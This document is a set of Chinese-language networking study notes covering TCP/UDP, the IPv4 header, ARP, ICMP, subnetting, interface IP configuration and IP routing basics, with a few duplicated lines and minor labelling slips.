Length:该字段指定UDP报头和数据总共占用的长度。可能的最小长度是8字节，因为 UDP报头已经占用了8字节。由于这个字段的存在，UDP报文总长不可能超过65535 字节（包括8字节的报头，和65527字节的数据）。 Checksum:覆盖UDP头部和UDP数据的校验和，长度为16比特 端口号 TCP的建立-三次握手 ▫由TCP连接发起方（图中PC1），发送第一个SYN位置1的TCP报文。初始序列号a为一 个随机生成的数字，因为没收到过来自PC2的任何报文，所以确认序列号为0 ； ▫ 接收方（图中PC2）接收到合法的SYN报文之后，回复一个SYN和ACK置1的TCP报文。 初始序列号b为一个随机生成的数字，同时因为此报文是回复给PC1的报文，所以确 认序列号为a+1； ▫ PC1接收到PC2发送的SYN和ACK置位的TCP报文后，回复一个ACK置位的报文，此时 序列号为a+1,确认序列号为b+1。PC2收到之后，TCP双向连接建立 TCP的序列号与确认序列号： TCP使用序列号和确认序列号字段实现数据的可靠和有序传输。 • 假设PC1要给PC2发送一段数据，传输过程如下： ​ ▫ 1. PC1将全部待TCP发送的数据按照字节为单位编上号。假设第一个字节的编号为 “a+1”，第二个字节的序号为“a+2”，依次类推。 ​ ▫ 2. PC1会把每一段数据的第一个字节的编号作为序列号（Sequence number），然后将TCP报文发送出去。 ​ ▫ 3. PC2在收到PC1发送来的TCP报文后，需要给予确认同时请求下一段数据，如何确 定下一段数据呢？序列号( a+1 )+载荷长度=下一段数据的第一个字节的序号 （a+1+12） ​ ▫ 4. PC1在收到PC2发送的TCP报文之后，发现确认序列号为“a+1+12” ，说明“a+1” 到“a+12”这一段的数据已经被接受，需要从“a+1+12”开始发送。 • 为了提升发送效率，也可以一次性发送多段数据，由接收方统一确认。 TCP的窗口滑动机制 • 1. 在TCP三次握手建立连接时，双方都会通过Window字段告诉对方本端最大能够接受的字 节数（也就是缓冲区大小）。 • 2. 连接建立成功之后，发送方会根据接受方宣告的Window大小发送相应字节数的数据。 • 3. 接受方接受到数据之后会放在缓冲区内，等待上层应用来取走缓冲的数据。若数据被上 层取走，则相应的缓冲空间将被释放。 • 4. 接收方根据自身的缓存空间大小通告当前的可以接受的数据大小( Window )。 • 5. 发送方根据接收方当前的Window大小发送相应数量的数据 TCP的关闭-四次挥手 ▫ 1. 由PC1发出一个FIN字段置”1 ”的不带数据的TCP段； ▫ 2. PC2收到PC1发来的FIN置位的TCP报文后，会回复一个ACK置位的TCP报文。 ▫ 3. 若PC2也没有需要发送的数据，则直接发送FIN置位的TCP报文。假设此时PC2还有 数据要发送，那么当PC2发送完这些数据之后会发送一个FIN置位的TCP报文去关闭连 接。 ▫ 4. PC1收到FIN置位的TCP报文，回复ACK报文，TCP双向连接断开 网络层传输层负责建立主机之间进程与进程之间的连接，而网络层则负责数据从一台主机到另一台主机之间的传递。 网络层的PDU被称为包 网络层协议工作过程 当采用IP作为网络层协议时，通信的双方都会被分配到一个“独一无二”的IP地址来标识自 己。IP地址可被写成32位的二进制整数值形式，但为了方便人们阅读和分析，它通常被写 成点分十进制的形式，即四个字节被分开用十进制表示，中间用点分隔，比如192.168.1.1。 IP数据包的封装与转发： 网络层收到上层（如传输层）协议传来的数据时候，会封装一个IP报文头部，并且把 源和目的IP地址都添加到该头部中。 中间经过的网络设备（如路由器），会维护一张指导IP报文转发的“地图”——路由 表，通过读取IP数据包的目的地址，查找本地路由表后转发IP数据包。 IP数据包最终到达目的主机，目的主机通过读取目的IP地址确定是否接受并做下一步 处理。 IP协议工作时，需要如OSPF、IS-IS、BGP等各种路由协议帮助路由器建立路由表，ICMP帮 忙进行网络的控制和状态诊断。 数据链路层数据链路层位于网络层和物理层之间，可以向网络层的IP、IPV6等协议提供服务，数据链路层的PDU被称为Frame（帧）。 以太网与MAC地址以太网：是一种支持多点接入的广播式数据链路层协议。个人电脑的网络接口遵循的就是以太网标准。一般情况下，一个广播域对应一个IP网段。 以太网MAC地址：MAC地址在网络中唯一标识一个网卡，每个网卡都需要且会有唯一的一个MAC地址，MAC地址用于在一个IP网段内，寻址找到具体的物理设备。工作在数据链路层的设备，例如以太网交换机，会维护一张MAC地址表，用于指导数据帧转发。MAC地址由48比特（6个字节）长，12位的16进制数字组成。例如：48-A4-72-1C-8F-4F 地址解析协议（ARP)ARP（Address Resolution Protocol，地址解析协议）是根据IP地址获取数据链路层地址的 一个TCP/IP协议。 ARP是IPv4中必不可少的一种协议，它的主要功能是： 将IP地址解析为MAC地址； 维护IP地址与MAC地址的映射关系的缓存，即ARP表项； 实现网段内重复IP地址的检测。 ARP的工作原理 网络设备一般都有一个ARP缓存（ARP Cache）。ARP缓存用来存放IP地址和MAC地址的关联信息。 在发送数据前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的ARP表项，则直接 采用该表项中的MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应信息， 则通过发送ARP Request报文来获得它。 学习到的IP地址和MAC地址的映射关系会被放入ARP缓存表中存放一段时间。在有效期内 （缺省：180s），设备可以直接从这个表中查找目的MAC地址来进行数据封装，而无需进 行ARP查询。过了这段有效期，ARP表项会被自动删除。 如果目标设备位于其他网络，则源设备会在ARP缓存表中查找网关的MAC地址。然后将数 据发送给网关。最后网关再把数据转发给目的设备 主机1的ARP缓存表中不存在主机2的MAC地址，所以主机1会发送ARP Request来获取目的 MAC地址。 ARP Request报文封装在以太帧里。帧头中的源MAC地址为发送端主机1的MAC地址。此时， 由于主机1不知道主机2的MAC地址，所以目的MAC地址为广播地址FF-FF-FF-FF-FF-FF。 ARP Request报文中包含发送端MAC地址、发送端IP地址、目的端MAC地址、目的端IP地 址，其中目的端MAC地址的值为0。ARP Request报文会在整个网络上传播，该网络中所有 主机包括网关都会接收到此ARP Request报文。 若不匹配则不会响应，若匹配则则该主机会 将ARP请求报文中的发送端MAC地址和发送端IP地址信息记录到自己的ARP缓存表中，然后 通过ARP Reply报文进行响应 主机2会向主机1回应ARP Reply报文。 ARP Reply报文中的发送端IP地址是主机2自己的IP地址，目的端IP地址是主机1的IP地址， 目的端MAC地址是主机1的MAC地址，发送端MAC地址是自己的MAC地址，同时操作类型 被设置为Reply。 ARP Reply报文通过单播传送 物理层数据到达物理层之后，物理层会根据物理介质的不同，将数字信号转换为光信号、电信号或者是电磁波信号 物理层的PDU被称为比特流 常见传输介质 双绞线：当今以太网最常见的传输介质，按照抗电磁干扰能力还可以分为： STP-屏蔽双绞线和UTP-非屏蔽双绞线 光纤传输，按照功能部件可分为： 光纤传输，按照功能部件可分为： 光模块：将电信号与光信号互转的器件，产生光信号。 串口电缆在WAN（Wide Area Network，广域网）中大规模使用，根据WAN线路类型不同， 串口电缆在设备上连接的接口类型也不同：异/同步串口、ATM接口、POS接口、CE1/PRI 接口等。 无线信号的传输可以通过电磁波进行，例如：无线路由器将数据通过调制以电磁波发送出 去，移动终端的无线网卡将电磁波解调，得到数据，完成从无线路由器到移动终端的数据 传输。 数据通信过程发送方数据封装-&gt;中间网络数据传输-&gt;接收方数据解封装 发送方数据封装 中间网络数据传输封装好的完整数据，会在网络中被传递 一般情况下： 网络中的二层设备（如以太网交换机）只会解封装数据的二层头部，根据二层头部的 信息进行相应的“交换”操作。 网络中的三层设备（如路由器）只会解封装到三层头部，并且根据三层头部的信息进 行相应的“路由”操作。 接收方数据解封装 经过中间网络传递之后，数据最终到达目的服务器。根据不同的协议头部的信息，数据将 被一层层的解封装并做相应的处理和传递，最终交由WEB服务器上的应用程序进行处理。 分层模型的概念的优势 各个层次之间分工、界限明确，有助于各个部件的开发、设计和故障排除。 通过定义在模型的每一层实现什么功能,鼓励产业的标准化。 通过提供接口的方式，使得各种类型的网络硬件和软件能够相互通信，提高兼容性。 网络层协议及IP编址网络层协议网络层协议包括IP协议，ICMP协议，IPX协议等 IP协议ip是Internet Protocol的缩写。Internet Protocol本身是一个协议文件的名称，该协议文件的内容非常少，主要是定义并阐述了IP报文的格式 经常被提及的IP，一般不是特指Internet Protocol这个协议本身，而是泛指直接或间接与IP协议相关的任何内容。 作用：为网络层的设备提供逻辑地址，负责数据包的寻址和转发。 IPv4（Internet Protocol Version 4）协议族是TCP/IP协议族中最为核心的协议族。它工作在TCP/IP协议栈的网络层，该层与OSI参考模型的网络层相对应。 IPv6（Internet Protocol Version 6）是网络层协议的第二代标准协议，也被称为IPng （IP Next Generation）。它是Internet工程任务组IETF（Internet Engineering Task Force）设计的一套规范，是IPv4（Internet Protocol Version 4）的升级版本。 数据封装 应用数据需要经过TCP/IP每一层处理之后才能通过网络传输到目的端，每一层上都使用该 层的协议数据单元PDU（Protocol Data Unit）彼此交换信息。 如上层数据在传输层添加TCP报头后得到的PDU被称为Segment（数据段）；数据段被传递给网络层，网络层添加IP报头得到的PDU被称为Packet（数据包）；数据包被传递到数据链路层，封装数据链路层报头和尾部得到的PDU被称为Frame（数据帧）； 最后，帧被转换为比特，通过网络介质传输。 IPV4报文格式 Version：4 bit，4：表示为IPv4；6：表示为IPv6。 Header Length：4 bit，首部长度，如果不带Option字段，则为20，最长为60。 Type of Service：8 bit，服务类型。只有在有QoS差分服务要求时，这个字段才起作用 Total Length：16 bit，总长度，整个IP数据包的长度。 Identification：16 bit，标识，分片重组时会用到该字段。 Flags：3 bit，标志位。 保留段位：0，保留。 不分段位：1，表示“不能分片”；0，表示“能分片”。 更多段位：1，表示“后面还有分片”；0，表示“最后一个数据片”。 Fragment Offset：12 bit，片偏移，分片重组时会用到该字段。指出较长的分组在分片后， 该片在原分组中的相对位置，与更多段位组合，帮助接收方组合分段的报文。 Time to Live：8 bit，生存时间。可经过的最多路由数，即数据包在网络中可通过的路由器数的最大值。 Protocol：8 bit，协议：下一层协议。指出此数据包携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给哪个进程处理。 1: ICMP, Internet Control Message； 2: IGMP, Internet Group Management； 6: TCP , Transmission Control Protocol； 17: UDP, User Datagram Protocol。 Header Checksum：16 bit，首部检验和。 Source IP Address：32 bit，源IP地址。 Destination IP Address：32 bit，目的IP地址。 Options：可变，选项字段。 Padding：可变，填充字段，全填0 数据包分片将报文分割成多个片段的过程叫分片 网络中转发的ip报文的长度可以不同，但若报文长度超过了数据链路所支持的最大长度，则报文就要分割成若干个较小的片段才能在链路上传输 与IP数据包包头中的Identification，Flags，Fragment Offset三部分内容有关 生存时间（Time to Live,TTL)TTL字段设置了数据包可以经过的路由器数目，一旦经过一个路由器，TTL值减一，当为0时，数据包被丢弃 报文在网段间转发时，如果网络设备上的路由规划不合理，就可能会出现环路，导致报文在网络中无限循环，无法到达目的端。环路发生后，所有发往这个目的地的报文都会被循环转发，随着这种报文逐渐增多，网络将会发生拥塞。 为避免环路导致的网络拥塞，IP报文头中包含一个生存时间TTL（Time To Live）字段。 报文每经过一台三层设备，TTL值减1。初始TTL值由源端设备设置。当报文中的TTL 降为0时，报文会被丢弃。同时，丢弃报文的设备会根据报文头中的源IP地址向源端 发送ICMP错误消息。（注意：网络设备也可被配置为不向源端发送ICMP错误消息。） 协议号目的端的网络层在接收并处理报文以后，需要决定下一步对报文如何处理。IP报文头中的协 议字段标识了将会继续处理报文的协议。 该字段可以标识网络层协议，如ICMP（Internet Control Message Protocol，因特网控制 报文协议，对应值0x01）；也可以标识上层协议，如TCP（Transmission Control Protocol， 传输控制协议，对应值0x06）、UDP（User Datagram Protocol，用户数据包协议，对应 值0x11） IPV4地址介绍IP地址是网络中用于标识一个节点（或者网络设备的接口） ip地址用于ip报文在网络中的寻址 在IP网络上，如果用户要将一台计算机连接到Internet上，就需要申请一个IP地址。IP地址 就像现实中的地址，可以标识网络中的一个节点，数据就是通过它来找到目的地的。即我 们通过IP地址实现全球范围内的网络通信。 IP地址是网络设备接口的属性，不是网络设备本身的属性。当我们说给某台设备分配一个IP 地址时，实质上是指给这台设备的某个接口分配一个IP地址。如果设备有多个接口，通常每 个接口都至少需要一个IP地址。 IPV4地址的表示P地址是长度是32 bit，由4个字节组成。为了阅读和书写方便，IP地址通常采用点分 十进制数来表示。 IPV4地址通常采用点分十进制表示 IPV4地址范围00000000.00000000.00000000.0000000011111111.11111111.11111111.1111111 1，即0.0.0.0255.255.255.255 IPV4地址构成网络部分（网络号）：用于标识一个网络 IP地址不能反映任何有关主机位置的地理信息，只能通过网络号码字段判断出 主机属于哪个网络。 对于网络号相同的设备，无论实际所处的物理位置如何，它们都是处在同一个 网络中。 主机部分（主机号）：用来区分一个网络内的不同主机 网络掩码（子网掩码）：区分一个ip地址中的网络部分和主机部分 网络掩码为32 bit，与IP地址的位数一样，通常也以点分十进制数来表示。 网络掩码不是一个IP地址，在二进制的表示上是一堆连续的1、后面接一堆连续的0。 通常将网络掩码中1的个数称为这个网络掩码的长度。如：掩码0.0.0.0的长度是0，掩 码252.0.0.0的长度是6。 网络掩码一般与IP地址结合使用，其中值为1的比特对应IP地址中的网络位；值为0的 比特对应IP地址中的主机位，以此来辅助我们识别一个IP地址中的网络位与主机位。 即网络掩码中1的个数就是IP地址的网络号的位数，0的个数就是IP地址的主机号的位 数 IP地址寻址网络号用于表示主机所在的网络，，类似于“XX省XX市XX区XX小区”的作用。 主机号用于表示网络号所定义的网络范围内某个特定的主机接口，类似于门牌号“XX栋XX 号”的作用。 网络寻址： 二层网络寻址：可直接通过IP地址，找到对应的主机接口。 三层网络寻址：利用网关转发来自不同网段之间的数据包。 网关： 报文转发过程中，首先需要确定转发路径以及通往目的网段的接口。如果目的主机与 源主机不在同一网段，报文需要先转发到网关，然后通过网关将报文转发到目的网段。 网关是指接收并处理本地网段主机发送的报文并转发到目的网段的设备。为实现此功能，网关必须知道目的网段的路由。网关设备上连接本地网段的接口地址即为该网段 的网关地址。 IP地址分类（有类编址） A、B、C、D、E类的类别字段分别是二进制数0、10、110、1110、1111，通过网络 号码字段的前几个比特就可以判断IP地址属于哪一类，这是区分各类地址最简单的方 法。 A、B、C三类地址是单播IP地址 (除一些特殊地址外)，只有这三类地址才能分配给主 机接口使用。 D类地址属于组播IP地址。 E类地址专门用于特殊的实验目的。 A,B,C类地址比较 使用A类地址的网络称为A类网络；使用B类地址的网络称为B类网络；使用C类地址的 网络称为C类网络。 使用A类地址的网络称为A类网络；使用B类地址的网络称为B类网络；使用C类地址的 网络称为C类网络。 B类网络的网络号为16 bit，介于A类和C类网络之间；首两位恒定为10，地址空间为： 128.0.0.0~191.255.255.255。 C类网络的网络号为24 bit，个数很多，但所允许的主机接口的个数就很少；首三位恒 定为110，地址空间为：192.0.0.0~223.255.255.255。 组播地址：组播能实现一对多传递消息。 IP地址类型网段：一个网络号所定义的网络范围 网络地址：用于标识一个网络 网络号为X，主机号的每个比特都为0。 不能分配给具体的主机接口使用。 广播地址：用于向该网络中的所有主机发送数据的特殊地址 网络号为X，主机号的每个比特都为1。 不能分配给具体的主机接口使用。 可用地址：又称主机地址，可用分配给具体的主机接口使用。 一个网段的主机位为n位，则IP地址数为：2ⁿ，可用IP地址数为：2ⁿ-2 (减去网络地址 和广播地址)。 私网IP地址公网IP地址：由IANA统一分配，以保证任何一个IP地址在Internet上的唯一性，这里的IP地址是指公网IP地址。 私网IP地址：私网IP地址的使用使得网络可以得到更为自由地扩展，因为同一个私网 IP地址是可以在不同的私有网络中重复使用的。在IP地址空间中，A,B,C三类地址各预留了一些地址专门用于私网IP地址 私有网络连接到Internet：私有网络由于使用了私网IP地址，是不允许连接到Internet的。 后来在实际需求的驱动下，许多私有网络也希望能够连接到Internet上，从而实现私网与 Internet之间的通信，以及通过Internet实现私网与私网之间的通信。私网与Internet的互联， 必须使用网络地址转换 (NAT)技术实现。 NAT (Network Address Translation)，网络地址转换，其基本作用是实现私网IP地址 与公网IP地址之间的转换。 特殊IP地址255.255.255.255：可作为目的地址发往网段所有主机（受限于网关） 这个地址称为有限广播地址，它可以作为一个IP报文的目的IP地址使用。 路由器接收到目的IP地址为有限广播地址的IP报文后，会停止对该IP报文的转发。 0.0.0.0： 如果把这个地址作为网络地址，它的意思就是“任何网络”的网络地址；如果把这个 地址作为主机接口地址，它的意思就是“这个网络上主机接口”的IP地址。 如果把这个地址作为网络地址，它的意思就是“任何网络”的网络地址；如果把这个 地址作为主机接口地址，它的意思就是“这个网络上主机接口”的IP地址。 127.0.0.1/8： 这个地址为环回地址，它可以作为一个IP报文的目的IP地址使用。其作用是测试设备 自身的软件系统。 一个设备产生的、目的IP地址为环回地址的IP报文是不可能离开这个设备本身的 169.254.0.0/16： 如果一个网络设备获取IP地址的方式被设置成了自动获取方式，但是该设备在网络上又没有找到可用的DHCP（动态主机配置协议，用于动态分配网络配置参数，如IP地址）服务器，那么该设备就会使用169.254.0.0/16网段的某个地 址来进行临时通信。 IPV4与IPV6 子网划分“有类编址”的地址划分过于死板，划分的颗粒度太大，会有大量的主机号不能被充分利 用，从而造成了大量的IP地址资源浪费。因此可以利用子网划分来减少地址浪费，即VLSM (Variable Length Subnet Mask)，可变 长子网掩码。将一个大的有类网络，划分成若干个小的子网，使得IP地址的使用更为科学。 如何进行子网划分原网段分析假设有一个C类网段地址：192.168.10.0；默认情况下，网络掩码为24位，包括24位网络位， 8位主机位。通过计算可知，这样的网络中，有256个IP地址（2的8次方）。 向主机借位，形成子网现在，将原有的24位网络位向主机位去“借”1位，这样网络位就扩充到了25位，相对的主 机位就减少到了7位，而借过来的这1位就是子网位，此时网络掩码就变成了25位，即 255.255.255.128，或/25。 子网位：可取值0或取值1，则得到了两个新的子网。 通过计算可知，现在网络中，有128个IP地址 计算子网网络地址计算网络地址，主机位全为0： 计算网络地址，主机位全为0： 如果子网位取值1，则网络地址为192.168.10.128/25 计算子网广播地址计算广播地址，主机位全为1： 如果子网位取值0，则网络地址为192.168.10.127/25。 如果子网位取值1，则网络地址为192.168.10.255/25。 ICMP协议是IP协议的辅助协议，用来在网络设备间传递各种差错和控制信息，对于收集各种网络信息、诊断和排除各种网络故障等方面起着至关重要的作用。 为了更有效地转发IP数据报文和提高数据报文交互成功的机会，在网络层使用ICMP协议。 ICMP允许主机或设备报告差错情况和提供有关异常情况的报告。 ICMP消息： ICMP消息封装在IP报文中，IP报文头部Protocol值为1时表示ICMP协议。 字段解释： ICMP消息的格式取决于Type和Code字段，其中Type字段为消息类型，Code字 段包含该消息类型的具体参数。 校验和字段用于检查消息是否完整。 消息中包含32 bit的可变参数，这个字段一般不使用，通常设置为0。 在ICMP重定向消息中，这个字段用来指定网关IP地址，主机根据这个地 址将报文重定向到指定网关。 在Echo请求消息中，这个字段包含标识符和序号，源端根据这两个参数 将收到的回复消息与本端发送的Echo请求消息进行关联。尤其是当源端 向目的端发送了多个Echo请求消息时，需要根据标识符和序号将Echo请 求和回复消息进行一一对应 ICMP重定向ICMP重定向报文是ICMP控制报文中的一种。在特定的情况下，当路由器检测到一台机器使用非最优路由的时候，它会向该主机发送一个ICMP重定向报文，请求主机改变路由 过程： 主机A希望发送报文到服务器A，于是根据配置的默认网关地址向网关RTB发送报文。 网关RTB收到报文后，检查报文信息，发现报文应该转发到与源主机在同一网段的另 一个网关设备RTA，此转发路径是更优的路径，所以RTB会向主机发送一个Redirect 消息，通知主机直接向另一个网关RTA发送该报文。 主机收到Redirect消息后，会向RTA发送报文，然后RTA会将该报文再转发给服务器 A ICMP差错检测ICMP Echo消息常用于诊断源和目的地之间的网络连通性，同时还可以提供其他信息，如报文往返时间等 ICMP的一个典型应用是Ping。Ping是检测网络连通性的常用工具，同时也能够收集其他相 关信息。用户可以在Ping命令中指定不同参数，如ICMP报文长度、发送的ICMP报文个数、 等待回复响应的超时时间等，设备根据配置的参数来构造并发送ICMP报文，进行Ping测试。ping常用于探测到达目的节点的网络可达性 ICMP错误报告ICMP定义了各种错误消息，用于诊断网络连接性问题；根据这些错误消息，源设备可以判 断出数据传输失败的原因。 如果网络中发生了环路，导致报文在网络中循环，且最终TTL超时，这种情况下网络 设备会发送TTL超时消息给发送端设备。 如果目的地不可达，则中间的网络设备会发送目的不可达消息给发送端设备。目的不 可达的情况有多种，如果是网络设备无法找到目的网络，则发送目的网络不可达消息； 如果网络设备无法找到目的网络中的目的主机，则发送目的主机不可达消息。 ICMP的另一个典型应用是Tracert。Tracert基于报文头中的TTL值来逐跳跟踪报文的转发路径。为了跟踪到达某特定目的地址的路径，源端首先将报文的TTL值设置为1。该报文到达第一个节点后，TTL超时，于是该节点向源端发送TTL超时消息，消息中携带时间戳。然后 源端将报文的TTL值设置为2，报文到达第二个节点后超时，该节点同样返回TTL超时消息， 以此类推，直到报文到达目的地。这样，源端根据返回的报文中的信息可以跟踪到报文经 过的每一个节点，并根据时间戳信息计算往返时间。Tracert是检测网络丢包和时延的有效手段，同时可以帮助管理源发现网络中的路由环路 IPV4地址配置及基本应用IP地址的基础配置命令进入接口视图： interface interface-type interface-number *interface-type interface-number:*指定接口类型和接口编号。接口类型和接口编号之间可以输入空格也可以不输 配置接口的IP地址 ip address ip-address&#123;mask|mask-length&#125; 在接口视图下，通过此命令来给网络设备上的接口配置ip地址，实现网络的互连。 ip-address：指定接口的ip地址，点分十进制形式 mask：指定子网掩码，点分十进制形式 mask-length：指定掩码长度，整数形式，取值范围是0-32. 案例：配置接口ip地址 物理接口：物理接口是指网络设备上实际存在的接口，分为负责承担业务传输的业务接口 和负责管理设备的管理接口，例如GE业务接口和MEth管理接口。 逻辑接口：逻辑接口是指能够实现数据交换功能但物理上不存在、需要通过配置建立的接 口，需要承担业务传输，例如VLANIF接口、Loopback接口。 Loopback接口：用户需要一个接口状态永远是Up的接口的IP地址时，可以选择 Loopback接口的IP地址。 Loopback接口：用户需要一个接口状态永远是Up的接口的IP地址时，可以选择 Loopback接口的IP地址。 Loopback接口配置IP地址后，就可以对外发布。Loopback接口上可以配置32位 掩码的IP地址，达到节省地址空间的目的。 Loopback接口不能封装任何链路层协议，数据链路层也就不存在协商问题，其 协议状态永远都是Up。 对于目的地址不是本地IP地址，出接口是本地Loopback接口的报文，设备会将 其直接丢弃。 网络IP地址规划规划目标：易管理、易扩展、利用率高。 规划原则： 唯一性：一个IP网络中不能有两个主机采用相同的IP地址。 连续性：连续地址在层次结构网络中易于进行路由汇总，大大缩减路由表，提高路由 计算的效率、加速路由收敛。 扩展性：地址分配在每一层次上都要有合理的预留，在网络规模扩展时能保证路由汇 总所需的连续性。避免网络扩展造成的地址、路由重新规划。 结构化、业务相关性：地址规划与网络拓扑结构和网络承载业务结合起来，便于路由 规划和QoS部署。好的IP地址规划使得每个地址都具有实际含义，看到一个地址就可 以大致判断出该地址所属的设备和对应的业务。 IP路由基础路由概述 当路由器从多种不同的途径获知到达同一个目的网段的路由(这些路由的目的网络地址及网络掩码均相同)时，会优先路由优先级值最小的路由；如果这些路由学习自相同的路由协议，则优选度量值最优的。总之，最优的路由加入路由表 当路由器收到一个数据包时，会在自己的路由表里查询数据包的目的IP地址，如果能够找到匹配的路由表项，则依据表项所指示的出接口及下一跳来转发数据；如果没有匹配的表现则丢弃该数据包 路由器的行为是逐级跳的，数据包从源到目的地沿路径每个路由器都必须有关于目标网段的路由，否则就会造成丢包 数据通信往往是双向的，因此要关注流量的往返(往返路由) 路由基本概念通过IP地址能够寻找到一个唯一的网络节点，每个IP都有自己所属的网段，这些网络可能分 布在世界各地，共同组成了全球的网络。 为了实现不同网段之间的相互通信，网络设备需要能够转发来自不同网段的IP报文，将其送 达不同的IP网段 路由 路由是指导报文转发的路径信息，通过路由可以确认转发IP报文的路径 路由设备是依据路由转发报文到目的网段的网络设备，最常见的路由设备：路由器 路由设备维护着一张路由表，保存着路由信息 网关以及中间节点（路由器）根据收到的IP报文其目的地址选择一条合适的路径，并将报文 转发到下一个路由器。在路径中的最后一跳路由器二层寻址将报文转发给目的主机。这个 过程被称为路由转发。 中间节点选择路径所依赖的表项为称为路由表。 路由条目包含明确的出接口以及下一跳，这两项信息指导IP报文转发到相应的下一跳设备上 路由信息 目的网络：标识目的网段 掩码：与目的地址共同标识一个网段 出接口：数据包被路由后离开本路由的接口 下一跳：路由器转发到达目的网段的数据包所使用的下一跳地址 这些信息标识了目的网段、明确了转发ip报文的路径 通过路由中包含的信息，路由设备可以转发IP报文到相应的路径。 目的地址、掩码用于识别IP报文目的地址，路由设备将IP报文匹配到相应的路由之后，根据 路由的出接口、下一跳确认转发的路径。 只有出接口并不能够确认转发IP报文的下一跳设备，还需要明确的下一跳设备地址。 路由表 路由器通过各种方式发现路由 路由器选择最优的路由条目放入路由表中 路由器指导设备对ip报文的转发 路由器通过对路由表的管理实现对路径的信息管理 路由器依据路由表转发报文。 路由表由一条条详细的路由条目组成。 路由表由路由条目组成，但不代表路由表中保存了所有路由，路由表中只会保存“最优的” 路由。 对路由表中的路由条目的管理实际上就是路由器维护、管理路由信息的具体实现 路由条目生成路由信息获取方式 路由器依据路由表进行路由转发，为实现路由转发，路由器需要发现路由。常见的有直连路由、静态路由和动态路由 直连接口所在网段的路由，由设备自动生成。 直连接口所在网段的路由，由设备自动生成。 动态路由：路由器通过动态路由协议（如OSPF、IS-IS、BGP等）学习到的路由 直连路由 直连路由指向本地直连网络的路由，由设备自动生成 当路由器为路由转发的最后一跳路由器时，IP报文匹配直连路由，路由器转发IP报文到目的主机 使用直连路由进行路由转发时，报文的目的IP和路由器接口IP在一个网段内 当匹配中直连路由进行转发时，此时路由器会查看ARP表项，将报文直接转到目的地址，此 时该路由器为路由转发的最后一跳路由器。 直连路由的下一跳地址并不是其他设备上的接口地址，因为该路由的目的网段为接口所在 网段，本接口就是最后一跳，不需要再转发给下一跳，所以在路由表中的下一跳地址就是 接口自身地址。 使用直连路由进行路由转发时，转发的动作不是交给下一跳，而是查询ARP表项，根据ARP 表项封装报文，将报文发送到目的IP。 并不是所有接口生成的直连路由都会出现在路由表中，直连路由出现在路由表中的前提是该接口的物理状态、协议状态都为up 最优路由条目优选ip路由表： Preference用于不同路由协议间路由优先级的比较，Cost用于同一种路由协议内部不同路由的优先级的比较。在业界，Cost也被称为路由度量值（Metric）。 路由优先级 - 常见默认值 优先级值（Preference）越小代表加入路由表的优先级越高 拥有最高优先级的路由将被添加进路由表 度量值 (cost)- 基本概念 当路由器通过某种协议发现了多条到达同一个目的网络的路由时(拥有相同的路由优先级)，度量值将作为路由优选的依据之一。 路由度量值表示到达这条路由所指目的地址的代价。 一些常用的度量值有：跳数、带宽、时延、代价、负载、可靠性等 度量数值越小越优先，度量值最小路由将会被添加到路由表中 路由转发最长匹配原则当路由器收到一个IP数据包时，会将数据包的目的IP地址与自己本地路由表中的所有路由表项进行逐位比对，直到找到匹配度最长的条目，这就是最长前缀匹配机制。 示例： 路由转发流程 来自10.0.1.0/24网段的IP报文想要去往40.0.1.0/24网段，首先到达网关，网关查找路由表项， 确定转发的下一跳、出接口，之后报文转发给R2。报文到达R2之后，R2通过查找路由表项转发给R3，R3收到后查找路由表项，发现IP报文目的IP属于本地接口所在网段，直接本地转发。 静态路由应用场景静态路由由网络管理员手动配置，配置方便，对系统要求低，适用于拓扑结构简单并且稳定的小型网络 缺点是不能自动适应网络拓扑的变化，需要人工干预。 配置 缺省路由缺省路由是一种特殊的路由，当报文没有在路由表中找到匹配的具体路由表项时才使用的路由。如果报文的目的地址不能与路由表的任何目的地址相匹配，那么该报文将选取缺省路由进行转发 缺省路由在路由表中的形式为0.0.0.0/0，缺省路由也叫做默认路由 缺省路由一般用于企业网络出口，配置一条缺省路由让出口设备能够转发前往internet上任意地址的ip报文。 动态路由当网络规模越来越大时，使用手动配置静态路由的方式获取路由条目将变得越发复杂，同时在拓扑发生变化时不能及时、灵活响应 动态路由协议有自己的路由算法，能够自动适应网络拓扑的变化，可以有效减少管理人员的工作量，适用于具有一定数量三层设备的网络。 分类根据路由信息传递的内容、计算路由的算法，可以将动态路由协议分为两大类 距离矢量协议（Distance-Vector Protocol） RIP 链路状态协议（Link-State Protocol） OSPF IS-IS BGP使用一种基于距离矢量算法修改后的算法，该算法被称为路径矢量（Path Vector） 算法。因此在某些场合下，BGP也被称为路径矢量路由协议。 根据工作范围不同，又可以分为 内部网关协议IGP（Interior Gateway Protocol）:在一个自治系统内部运行。RIP、 OSPF、ISIS为常见的IGP协议。 外部网关协议EGP（Exterior Gateway Protocol）：运行于不同自治系统之间。BGP 是目前最常用的EGP协议。 路由高级特性路由递归路由必须有直连的下一跳才能够指导转发，但是路由生成时下一跳可能不是直连的，因此需要计算出一个直连的下一跳和对应的出接口，这个过程叫做路由递归，也被称为路由迭代。 等价路由路由表中存在等价路由之后，前往该目的网段的IP报文路由器会通过所有有效的接口、下一跳转发，这种转发行为被称为负载分担 浮动路由静态路由支持配置时手动指定优先级，可以通过配置目的地址/掩码相同、优先级不同、下一跳不同的静态路由，实现转发路径的备份。 浮动路由是主用路由的备份，保证链路故障时提供备份路由。主用路由下一跳可达时该备份路由不会出现在路由表中 示例 RTA-RTB之间的链路正常时，20.0.0.0/30的两条路由条目都是有效的条目，此时比较优先 级，下一跳为10.1.1.2的优先级60，下一跳为10.1.2.2的优先级70，因此下一跳为10.1.1.2的 加入路由表。 RTA-RTB之间的链路故障时，10.1.1.2不可达，因此下一跳为10.1.1.2的路由失效，此时前 往20.0.0.0/30的路由就只存在一条，该条路由将会被选入路由表。前往20.0.0.1的流量将会 被转发到10.1.2.2 路由汇总CIDR(无类别域间路由)采用ip地址加掩码长度来标识网络和子网，而不是按照穿透的A、B、C等类型对网络地址进行划分 CIDR容许任意长度的掩码长度，将ip地址看出连续的地址空间，可以使用任意长度的前缀分配，多个连续的前缀可以聚合成一个网络，该特性可以有效减少路由表条目数量 路由汇总需求子网划分、VLSM解决了地址空间浪费的问题，但同时也带来了新的问题：路由表中的路由条目数量增加。 为减少路由条目数量可以使用路由汇总 